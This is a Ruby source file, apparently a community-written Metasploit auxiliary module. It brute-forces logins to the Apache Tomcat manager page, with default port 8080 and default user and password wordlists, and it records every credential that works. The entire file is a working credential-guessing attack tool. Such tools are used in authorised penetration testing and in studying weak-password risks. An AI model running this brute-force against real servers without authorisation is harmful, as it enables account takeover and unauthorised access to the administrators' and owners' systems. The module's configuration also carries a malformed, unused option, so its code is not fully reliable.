##
# This fle may be part of the Metasploit Framework and may be subject to
# redistribution and comercial restrictions. Please see the Metasploit
# Framework web site for more information on licesing and terms of use.
# This file was made by a newbie, don't trust it too much. :v
# https://github.com/rapid7/metasploit-framework/wiki/Creating-Metasploit-Framework-LoginScanners
##

require 'msf/core'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/tomcat'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::AuthBrute

	def proto
		'tomcat'
	end

	def initialize
		super(
			'Name'		=> 'Tomcat BruteForce Tool',
			'Description'	=> 'Will try to login in the application manager using different usernames an passwords',
			'Author'	=> 'VirgilioCR',
			'References'	=> [['CVE','1999-0502']], #Weak password
			'License'	=> 'MSF_LICENSE'
		)

		register_options(
			[
			  Opt::RPORT(8080),
			  OptString.new('USERNAME', [false, "Username that will be used to try each login",'']),
			  OptString.new('PASSWORD', [false, "Password that will be used to try each login",'']),
			  OptString.new('LOGIN_URI', [true, "URI that targets the login page where the user/pass will be used", "/manager/html",'']),
			  OptPath.new('USERNAME_FILE', [false, "File that contains a list of users for login attempts",
				File.join(Msf::Config.data_directory,"wordlists","tomcat_mgr_default_users.txt")]),
			  OptPath.new('PASSWORD_FILE', [false, "File that contains a list of passwords for login attempts",
				File.join(Msf::Config.data_directory, "wordlists","tomcat_mgr_default_pass.txt")])
			], self.class)
	end

	def run_host(ip)
		cred_collection = Metasploit::Framework::CredentialCollection.new(
			blank_passwords: datastore['BLANK_PASSWORDS'],
			pass_file: datastore['PASSWORD_FILE'],
			password: datastore['PASSWORD'],
			user_file: datastore['USERNAME_FILE'],
			username: datastore['USERNAME']
		)

		cred_collection = prepend_db_passwords(cred_collection) #(Authbrute) - antepone passwords de la base de datos
		s = Metasploit::Framework::LoginScanner::Tomcat.new(
			configure_http_login_scanner( #Converts datastore options into conf params for Metasploit::LoginScanner::Http class
			   cred_details: cred_collection,
			   stop_on_success: datastore['STOP_ON_SUCCESS'],
			)
		)

		s.scan! do |result|
			credential_data = result.to_h
			credential_data.merge!(
			   module_fullname: self.fullname,
			   workspace_id: myworkspace_id
			)
			if result.success?
				credential_core = create_credential(credential_data)
				credential_data[:core] = credential_core
				create_credential_login(credential_data)
				print_good "#{ip}:#{rport} - JA!: #{result.credential}"
			else
				invalidate_login(credential_data)
				print_status "#{ip}:#{rport} - NEIN!: #{result.credential}"
			end
		end
	end
end
